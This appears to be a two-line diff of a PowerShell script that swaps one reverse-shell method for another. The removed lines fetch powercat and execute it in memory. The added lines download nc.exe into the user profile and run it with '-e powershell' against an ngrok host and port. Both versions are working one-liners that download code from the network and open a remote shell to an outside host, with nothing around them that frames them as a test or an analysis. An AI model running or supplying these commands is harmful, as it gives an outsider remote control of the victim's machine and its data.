@@ -1,2 +1,2 @@
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
-powercat -c 2.tcp.ngrok.io -p 16455
+invoke-webrequest -uri "https://github.com/4V4loon/tools/blob/master/nc.exe?raw=true" -out $env:userprofile\nc.exe
+cmd /c "$env:userprofile\nc.exe -e powershell 2.tcp.ngrok.io 16455"
